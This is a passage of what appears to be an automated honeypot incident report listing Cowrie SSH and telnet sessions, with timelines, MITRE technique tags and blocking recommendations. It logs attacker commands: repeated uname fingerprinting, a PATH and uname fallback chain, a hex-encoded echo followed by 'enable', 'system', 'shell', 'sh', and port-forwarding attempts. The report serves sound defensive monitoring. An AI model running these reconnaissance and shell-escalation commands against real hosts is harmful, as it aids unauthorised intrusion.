| `2026-07-21 04:03:28` | `cowrie.command.input` |
| `2026-07-21 04:03:28` | `cowrie.log.closed` |
| `2026-07-21 04:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626464c24d94

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:31` | `cowrie.session.connect` |
| `2026-07-21 04:03:31` | `cowrie.client.version` |
| `2026-07-21 04:03:31` | `cowrie.client.kex` |
| `2026-07-21 04:03:32` | `cowrie.login.success` |
| `2026-07-21 04:03:33` | `cowrie.session.params` |
| `2026-07-21 04:03:33` | `cowrie.command.input` |
| `2026-07-21 04:03:33` | `cowrie.log.closed` |
| `2026-07-21 04:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a41a7d74043d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:36` | `cowrie.session.connect` |
| `2026-07-21 04:03:36` | `cowrie.client.version` |
| `2026-07-21 04:03:36` | `cowrie.client.kex` |
| `2026-07-21 04:03:36` | `cowrie.login.success` |
| `2026-07-21 04:03:37` | `cowrie.session.params` |
| `2026-07-21 04:03:37` | `cowrie.command.input` |
| `2026-07-21 04:03:37` | `cowrie.log.closed` |
| `2026-07-21 04:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d11188990a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:41` | `cowrie.session.connect` |
| `2026-07-21 04:03:41` | `cowrie.client.version` |
| `2026-07-21 04:03:41` | `cowrie.client.kex` |
| `2026-07-21 04:03:42` | `cowrie.login.success` |
| `2026-07-21 04:03:42` | `cowrie.session.params` |
| `2026-07-21 04:03:42` | `cowrie.command.input` |
| `2026-07-21 04:03:43` | `cowrie.log.closed` |
| `2026-07-21 04:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a9652323290

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:46` | `cowrie.session.connect` |
| `2026-07-21 04:03:46` | `cowrie.client.version` |
| `2026-07-21 04:03:46` | `cowrie.client.kex` |
| `2026-07-21 04:03:47` | `cowrie.login.success` |
| `2026-07-21 04:03:47` | `cowrie.session.params` |
| `2026-07-21 04:03:47` | `cowrie.command.input` |
| `2026-07-21 04:03:48` | `cowrie.log.closed` |
| `2026-07-21 04:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b9413f758d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:51` | `cowrie.session.connect` |
| `2026-07-21 04:03:51` | `cowrie.client.version` |
| `2026-07-21 04:03:51` | `cowrie.client.kex` |
| `2026-07-21 04:03:52` | `cowrie.login.success` |
| `2026-07-21 04:03:52` | `cowrie.session.params` |
| `2026-07-21 04:03:52` | `cowrie.command.input` |
| `2026-07-21 04:03:53` | `cowrie.log.closed` |
| `2026-07-21 04:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c24033fa7b41

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:54` | `cowrie.session.connect` |
| `2026-07-21 04:03:54` | `cowrie.client.version` |
| `2026-07-21 04:03:54` | `cowrie.client.kex` |
| `2026-07-21 04:03:58` | `cowrie.login.success` |
| `2026-07-21 04:04:00` | `cowrie.session.params` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:00` | `cowrie.command.success` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:00` | `cowrie.command.input` |
| `2026-07-21 04:04:01` | `cowrie.log.closed` |
| `2026-07-21 04:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e7578880c24

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:56` | `cowrie.session.connect` |
| `2026-07-21 04:03:56` | `cowrie.client.version` |
| `2026-07-21 04:03:56` | `cowrie.client.kex` |
| `2026-07-21 04:03:57` | `cowrie.login.success` |
| `2026-07-21 04:03:58` | `cowrie.session.params` |
| `2026-07-21 04:03:58` | `cowrie.command.input` |
| `2026-07-21 04:03:58` | `cowrie.log.closed` |
| `2026-07-21 04:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd1bf036c600

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:01` | `cowrie.session.connect` |
| `2026-07-21 04:04:01` | `cowrie.client.version` |
| `2026-07-21 04:04:01` | `cowrie.client.kex` |
| `2026-07-21 04:04:02` | `cowrie.login.success` |
| `2026-07-21 04:04:02` | `cowrie.session.params` |
| `2026-07-21 04:04:02` | `cowrie.command.input` |
| `2026-07-21 04:04:02` | `cowrie.log.closed` |
| `2026-07-21 04:04:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5354bb070fab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:06` | `cowrie.session.connect` |
| `2026-07-21 04:04:06` | `cowrie.client.version` |
| `2026-07-21 04:04:06` | `cowrie.client.kex` |
| `2026-07-21 04:04:06` | `cowrie.login.success` |
| `2026-07-21 04:04:07` | `cowrie.session.params` |
| `2026-07-21 04:04:07` | `cowrie.command.input` |
| `2026-07-21 04:04:07` | `cowrie.log.closed` |
| `2026-07-21 04:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d226a4d2064

| Field | Detail |
|---|---|
| **Source IP** | `198.98.53[.]110` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system, shell, sh` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:10` | `cowrie.session.connect` |
| `2026-07-21 04:04:12` | `cowrie.telnet.option` |
| `2026-07-21 04:04:12` | `cowrie.telnet.option` |
| `2026-07-21 04:04:12` | `cowrie.login.success` |
| `2026-07-21 04:04:13` | `cowrie.session.params` |
| `2026-07-21 04:04:14` | `cowrie.telnet.option` |
| `2026-07-21 04:04:14` | `cowrie.telnet.option` |
| `2026-07-21 04:04:14` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.failed` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.failed` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.failed` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:19` | `cowrie.log.closed` |
| `2026-07-21 04:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.53[.]110` to AbuseIPDB if not already reported
- [ ] Block `198.98.53[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e6a92ddfaa1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:10` | `cowrie.session.connect` |
| `2026-07-21 04:04:10` | `cowrie.client.version` |
| `2026-07-21 04:04:10` | `cowrie.client.kex` |
| `2026-07-21 04:04:11` | `cowrie.login.success` |
| `2026-07-21 04:04:12` | `cowrie.session.params` |
| `2026-07-21 04:04:12` | `cowrie.command.input` |
| `2026-07-21 04:04:12` | `cowrie.log.closed` |
| `2026-07-21 04:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed5d9d04dc20

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:15` | `cowrie.session.connect` |
| `2026-07-21 04:04:15` | `cowrie.client.version` |
| `2026-07-21 04:04:15` | `cowrie.client.kex` |
| `2026-07-21 04:04:16` | `cowrie.login.success` |
| `2026-07-21 04:04:17` | `cowrie.session.params` |
| `2026-07-21 04:04:17` | `cowrie.command.input` |
| `2026-07-21 04:04:17` | `cowrie.log.closed` |
| `2026-07-21 04:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-910f3bdba06d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:20` | `cowrie.session.connect` |
| `2026-07-21 04:04:20` | `cowrie.client.version` |
| `2026-07-21 04:04:20` | `cowrie.client.kex` |
| `2026-07-21 04:04:21` | `cowrie.login.success` |
| `2026-07-21 04:04:22` | `cowrie.session.params` |
| `2026-07-21 04:04:22` | `cowrie.command.input` |
| `2026-07-21 04:04:22` | `cowrie.log.closed` |
| `2026-07-21 04:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-961c08e901e0

| Field | Detail |
|---|---|
| **Source IP** | `83.239.108[.]218` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:24` | `cowrie.session.connect` |
| `2026-07-21 04:04:24` | `cowrie.client.version` |
| `2026-07-21 04:04:24` | `cowrie.client.kex` |
| `2026-07-21 04:04:25` | `cowrie.login.success` |
| `2026-07-21 04:04:25` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.108[.]218` to AbuseIPDB if not already reported
- [ ] Block `83.239.108[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f699ee98ae0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:25` | `cowrie.session.connect` |
| `2026-07-21 04:04:25` | `cowrie.client.version` |
| `2026-07-21 04:04:25` | `cowrie.client.kex` |
| `2026-07-21 04:04:26` | `cowrie.login.success` |
| `2026-07-21 04:04:27` | `cowrie.session.params` |
| `2026-07-21 04:04:27` | `cowrie.command.input` |
| `2026-07-21 04:04:27` | `cowrie.log.closed` |
| `2026-07-21 04:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b152a3770f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:30` | `cowrie.session.connect` |
| `2026-07-21 04:04:30` | `cowrie.client.version` |
| `2026-07-21 04:04:30` | `cowrie.client.kex` |
| `2026-07-21 04:04:31` | `cowrie.login.success` |
| `2026-07-21 04:04:31` | `cowrie.session.params` |
| `2026-07-21 04:04:31` | `cowrie.command.input` |
| `2026-07-21 04:04:31` | `cowrie.log.closed` |
| `2026-07-21 04:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0991e5f68c

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:30` | `cowrie.session.connect` |
| `2026-07-21 04:04:31` | `cowrie.client.version` |
| `2026-07-21 04:04:31` | `cowrie.client.kex` |
| `2026-07-21 04:04:32` | `cowrie.login.success` |
| `2026-07-21 04:04:32` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8084501c2e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:35` | `cowrie.session.connect` |
| `2026-07-21 04:04:35` | `cowrie.client.version` |
| `2026-07-21 04:04:35` | `cowrie.client.kex` |
| `2026-07-21 04:04:35` | `cowrie.login.success` |
| `2026-07-21 04:04:36` | `cowrie.session.params` |
| `2026-07-21 04:04:36` | `cowrie.command.input` |
| `2026-07-21 04:04:36` | `cowrie.log.closed` |
| `2026-07-21 04:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2f12485e5f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:39` | `cowrie.session.connect` |
| `2026-07-21 04:04:39` | `cowrie.client.version` |
| `2026-07-21 04:04:39` | `cowrie.client.kex` |
| `2026-07-21 04:04:40` | `cowrie.login.success` |
| `2026-07-21 04:04:41` | `cowrie.session.params` |
| `2026-07-21 04:04:41` | `cowrie.command.input` |
| `2026-07-21 04:04:41` | `cowrie.log.closed` |
| `2026-07-21 04:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a171deaf091

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:44` | `cowrie.session.connect` |
| `2026-07-21 04:04:44` | `cowrie.client.version` |
| `2026-07-21 04:04:44` | `cowrie.client.kex` |
| `2026-07-21 04:04:44` | `cowrie.login.success` |
| `2026-07-21 04:04:46` | `cowrie.session.params` |
| `2026-07-21 04:04:46` | `cowrie.command.input` |
| `2026-07-21 04:04:46` | `cowrie.log.closed` |
| `2026-07-21 04:04:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01b2fe5ad59

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:49` | `cowrie.session.connect` |
| `2026-07-21 04:04:49` | `cowrie.client.version` |
| `2026-07-21 04:04:49` | `cowrie.client.kex` |
| `2026-07-21 04:04:49` | `cowrie.login.success` |
| `2026-07-21 04:04:50` | `cowrie.session.params` |
| `2026-07-21 04:04:50` | `cowrie.command.input` |
| `2026-07-21 04:04:50` | `cowrie.log.closed` |
| `2026-07-21 04:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa3009a2368e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:54` | `cowrie.session.connect` |
| `2026-07-21 04:04:54` | `cowrie.client.version` |
| `2026-07-21 04:04:54` | `cowrie.client.kex` |
| `2026-07-21 04:04:54` | `cowrie.login.success` |
| `2026-07-21 04:04:55` | `cowrie.session.params` |
| `2026-07-21 04:04:55` | `cowrie.command.input` |
| `2026-07-21 04:04:55` | `cowrie.log.closed` |
| `2026-07-21 04:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17d2f7211da5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:04 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:04:58` | `cowrie.session.connect` |
| `2026-07-21 04:04:58` | `cowrie.client.version` |
| `2026-07-21 04:04:58` | `cowrie.client.kex` |
| `2026-07-21 04:04:59` | `cowrie.login.success` |
| `2026-07-21 04:05:00` | `cowrie.session.params` |
| `2026-07-21 04:05:00` | `cowrie.command.input` |
| `2026-07-21 04:05:00` | `cowrie.log.closed` |
| `2026-07-21 04:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618b7dbbeac9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:05 |
| **Last Seen** | 2026-07-21 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
